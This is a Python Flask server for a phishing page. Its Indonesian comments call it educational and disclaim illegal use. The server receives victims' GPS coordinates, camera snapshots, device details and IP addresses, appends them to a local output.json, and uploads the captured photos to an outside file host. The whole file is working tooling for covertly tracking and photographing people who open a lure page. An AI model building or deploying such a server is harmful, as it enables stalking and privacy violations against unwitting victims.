# Hello wellcome To My Code
# Warning: Code ini dibuat untuk mempelajari cara kerja Phising
# Bukan Utuk Kegiatan Ilegall
# Penggunaaan Ilegall Diluar Taggung Jawab Admin
# github.com/AmmarrBN & github.com/Hoshiyuki-Api

from flask import Flask, render_template, request, jsonify
import base64
import json
import requests
from io import BytesIO
from bs4 import BeautifulSoup

app = Flask(__name__)

def upload_image(buffer, filename):
    # Fungsi From Data Nya dan Uploader
    form = {
        "file": (filename, buffer)
    }

    try:
        response = requests.post("https://uploader.nyxs.pw/upload", files=form)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        url = soup.find("a")["href"]
        
        if not url:
            raise Exception("URL not found in response")

        return url
    except Exception as error:
        raise Exception(f"Error: {error}")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit_data", methods=["POST"])
def submit_data():
    data = request.json

    # Proses data lokasi
    latitude = data.get("latitude")
    longitude = data.get("longitude")

    if latitude and longitude:
        print(f"User Allow Location: Latitude={latitude}, Longitude={longitude}")

        # Save lokasi ke output.json
        output_data = {
            "latitude": latitude,
            "longitude": longitude
        }

        with open("output.json", "a") as json_file:
            json.dump(output_data, json_file, indent=4)
            json_file.write(",\n")

    # Proses data gambar (Upload Gambar)
    image_data = data.get("image")
    if image_data:
        try:
            image_bytes = base64.b64decode(image_data.split(",")[1])
            image_url = upload_image(BytesIO(image_bytes), "captured_image.png")
            print(f"Image uploaded successfully: {image_url}")
        except Exception as e:
            print(f"Error uploading image: {e}")
            image_url = None

    # Log informasi perangkat
    device_info = data.get("deviceInfo")
    device_brand = data.get("deviceBrand")
    ip = data.get("ip")
    print(f"Device Info: {device_info}")
    print(f"Device Brand: {device_brand}")
    print(f"IP Address: {ip}")

    # Append JSON (Biar Rapi)
    output_data = {
        "deviceInfo": device_info,
        "deviceBrand": device_brand,
        "ip": ip,
        "image_url": image_url if image_url else "Failed to upload image"
    }

    # Save ke file output.json
    with open("output.json", "a") as json_file:
        json.dump(output_data, json_file, indent=4)
        json_file.write(",\n")

    return jsonify({"status": "success", "message": "Data received successfully"})

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=8989)
